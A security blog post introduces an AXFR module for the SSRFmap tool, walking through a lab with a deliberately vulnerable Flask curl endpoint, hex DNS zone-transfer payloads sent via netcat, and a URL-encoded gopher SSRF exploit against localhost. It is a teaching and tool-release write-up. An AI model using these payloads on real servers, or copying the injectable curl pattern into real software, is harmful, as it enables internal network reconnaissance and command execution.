---
layout: post
title: SSRFmap - Introducing the AXFR module
---

## SSRFmap - Introducing the AXFR module

After reading a great blog post about a CTF challenge where you had to chain several SSRF to get the flag, I took some time to improve SSRFmap, fix the bugs and merge the Pull Requests. Then I implemented a new module called `axfr` to trigger a DNS zone transfer from the SSRF using the gopher protocol. This blog post is about my journey on implementing it.

![](/images/SSRFmapAXFR/banner_text.png)

<!--more-->

Before going further, we need to define what is a DNS zone transfer. Let's ask ChatGPT for a quick description of this interesting DNS feature.

> A DNS zone transfer is a process used to replicate the DNS records from the master DNS server to secondary DNS servers. This ensures that all the DNS servers in a domain have the same information, which is crucial for redundancy and load balancing. Zone transfers are typically initiated by the secondary server, requesting a copy of the DNS zone file from the primary server. They can be done in two main ways: full zone transfer (AXFR) and incremental zone transfer (IXFR).


[SSRFmap](https://github.com/swisskyrepo/SSRFmap) is a tool I started 6 years ago, I'm proud to release the v2 now, with new modules, improvements for the Docker container, and new SSRF scenarios in the tests cases. Also issues have been fixed and dependencies upgraded. It should be a breeze to use it for your SSRF exploitation scenario, either in CTF and real world targets.


Now let's create a lab with a basic SSRF vulnerability and a DNS service. For the SSRF we will use the examples of SSRFmap: [SSRFmap/examples/example.py](https://github.com/swisskyrepo/SSRFmap/blob/master/examples/example.py), which is just a Flask app with the endpoint `ssrf` that will spawn a `curl` command with the provided URL.

:warning: This code is vulnerable to SSRF but also to Remote Command Execution. Be careful when you run it, and restrict your network interactions. 

{% highlight py%}
from flask import Flask, request 
import re
import subprocess
import urllib.parse

app = Flask(__name__)

@app.route("/ssrf", methods=['POST'])
def ssrf():
    data = request.values
    content = command(f"curl {data.get('url')}")
    return content
{% endhighlight %}

We also need the file [SSRFmap/examples/ssrf_dns.py](https://github.com/swisskyrepo/SSRFmap/blob/master/examples/ssrf_dns.py) from the examples folder. Then we start both, either on your machine with `python examples/example.py` and `python examples/ssrf_dns.py` or with the docker commands to have every requirements correctly installed:

{% highlight ps1%}
docker build --no-cache -t ssrfmap .
docker run -it -v $(pwd):/usr/src/app --name example ssrfmap examples/example.py
docker exec -u root:root -it example python examples/ssrf_dns.py
{% endhighlight %}

Now you should be able to interact with the ssrf service using a curl command: `curl -i -X POST -d 'url=http://example.com' http://localhost:5000/ssrf`, and it will fetch the content of the example.com website.


The best way to debug when you are sending queries over the network is to run `wireshark` in the background. This way you can inspect the request, save the payload and even replay it later.

Let's start with a simple AXFR query directly to the DNS server: `dig @127.0.0.1 -p 53 example.lab AXFR`

In this example:

- `@127.0.0.1`: specify the DNS server to query
- `53` is the port number to connect to on the DNS server
- `example.lab` is the domain name for which the DNS records are being queried
- `AXFR`, the type of DNS query to execute

Our wireshark capture contains the AXFR query.

![](/images/SSRFmapAXFR/wireshark-dns.png)


Let's inspect the query in details using the wireshark dissector:

![](/images/SSRFmapAXFR/wireshark-data-text.png)

This DNS query can be extracted as hex with `Copy as hex stream` in Wireshark: `0034a9c100200001000000000001076578616d706c65036c61620000fc000100002904d000000000000c000a0008180f72afca818649`

![](/images/SSRFmapAXFR/wireshark-data-hex.png)


The AXFR request format is as follow.

**Header**

| Data     | Description |
| -------- | ----------- |
| XX       | Length |
| XXXX     | Two-byte query ID selected by the client |
| 0020     | Standard query |
| 00       | Recursion not available, no Z bits, RCODE 0 |
| 0001     | Exactly one question |
| 0000     | Answer records       |
| 0000     | Authority records    |
| 0001     | Additional records   |


**Query**

| Data           | Description |
| -------------- | ----------- |
| 07             | Length domain part 1: 7 |
| 6578616d706c65 | Domain part 1: `example` |
| 03             | Length domain part 2: 3 |
| 6c616          | Domain part 2: `lab` |
| 00fc           | AXFR query: 252 |
| 0001           | Internet query class |


**Additional Record**

This part is not essential for our exploit, but I included it in this blog post for the sake of completeness.

| Data             | Description |
| ---------------- | ----------- |
| 00               | Name |
| 0029             | Type OPT |
| 04d00            | UDP payload |
| 00               | Something? |
| 00               | EDNSO version |
| 0000             | Z |
| 00c0             | Data length |
| 00a0008180f72afca818649 | Option COOKIE |
 

We will replay this query using `netcat` on port 53 (TCP). This works because the DNS server from `ssrf_dns.py` is listening on both UDP and TCP.

{% highlight ps1%}
echo 0034a9c100200001000000000001076578616d706c65036c61620000fc000100002904d000000000000c000a0008180f72afca818649 | xxd -r -p | nc 127.0.0.1 53
{% endhighlight %}

But we can shorten this payload by removing the `Additional records`, change `01` to `00` in the correct part of the header.
Don't forget to change the length in the header section.


{% highlight ps1%}
# Payload: 00[LENGTH]a9c1002000010000000000[ADDITIONAL_RECORD]076578616d706c65036c61620000fc0001 
echo 001da9c100200001000000000000076578616d706c65036c61620000fc0001 | xxd -r -p | nc 127.0.0.1 53
{% endhighlight %}

![](/images/SSRFmapAXFR/out-xfr-answer.png)


Finally, the server answers with 4 subdomains on `example.lab`. 

{% highlight ps1%}
frontend.example.lab.   0       IN      A       10.10.10.10
backend.example.lab.    0       IN      A       10.10.10.11
secret_flag.example.lab. 0      IN      A       10.10.10.12
test.example.lab.       0       IN      A       10.10.10.12
{% endhighlight %}

Now the next step is to transform this request to be able to send it through an SSRF. For this, we will use the gopher protocol.

> The Gopher protocol (/ˈɡoʊfər/) is a communication protocol designed for distributing, searching, and retrieving documents in Internet Protocol networks. - Wikipedia

It is very easy to use this protocol with the gopher scheme: `gopher://IP:PORT/_DATA`.

In theory, the payload should be as follow: `gopher://127.0.0.1:53/_%00%1d%a9%c1%00%20%00%01%00%00%00%00%00%00%07%65%78%61%6d%70%6c%65%03%6c%61%62%00%00%fc%00%01`. The final exploit requires an URL encoding.

{% highlight ps1%}
curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%25
6d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd
{% endhighlight %}

However, in my first attempt it didn't work because the gopher protocol is not accepting a NULL BYTE (`%00`). I went into the issues of the curl project and I discovered this one : [issues/9089](https://github.com/curl/curl/issues/9089)

> Yes, using libcurl/7.47.0. I can run this command curl 'gopher://127.0.0.1:1234/_%0012' without any error.

It picked my interest, here is a small table with known vulnerable version.

| libcurl version | Vuln ?          |
| --------------- | --------------- |
| 7.47.0          | Vulnerable      |
| 7.71.0          | Vulnerable      |
| 7.79.1          | Not vulnerable  |
| 8.X             | Not vulnerable  |

A patch seems to be implemented since version 7.71.1 [Commit #31e53584db5879894809fbde5445aac7553ac3e2](https://github.com/curl/curl/commit/31e53584db5879894809fbde5445aac7553ac3e2).


![](/images/SSRFmapAXFR/null-byte-not-supported.png)


Anyway, if you encounter a vulnerable version in the wild, the final code for the module is released here: [swisskyrepo/SSRFmap/modules/axfr.py](https://github.com/swisskyrepo/SSRFmap/blob/master/modules/axfr.py) and you can use the following command line to use it.

{% highlight ps1%}
docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m axfr --lhost 127.0.0.1 --lport 53 --ldomain example.lab
{% endhighlight %}

![](/images/SSRFmapAXFR/module-output.jpg)


### References

This blog post was inspired by these great write-ups of the FCSC 2024 challenges. Have a look at them ! :)

- [https://vozec.fr/writeups/pong-fcsc2024-en/](https://vozec.fr/writeups/pong-fcsc2024-en/)
- [https://mizu.re/post/pong](https://mizu.re/post/pong)
- [https://gist.github.com/Siss3l/32591a6d6f33f78bb300bfef241de262](https://gist.github.com/Siss3l/32591a6d6f33f78bb300bfef241de262)